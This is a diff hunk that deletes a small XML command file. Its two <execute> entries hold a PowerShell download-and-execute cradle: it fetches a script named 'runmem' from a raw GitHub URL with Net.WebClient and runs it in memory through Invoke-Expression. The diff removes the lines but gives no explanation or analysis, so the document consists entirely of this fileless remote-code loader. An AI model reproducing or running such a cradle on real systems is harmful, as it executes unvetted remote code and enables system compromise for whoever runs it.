@@ -1,7 +1,0 @@
-<?xml version="1.0"?>
-<CMD>
-   <Liquidsky>
-      <execute>$script = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fuzzlove/alpha-testing/refs/heads/main/runmem')</execute>
-     <execute>Invoke-Command -ScriptBlock { Invoke-Expression $args[0] } -ArgumentList $script</execute>
-   </Liquidsky>
-  </CMD>
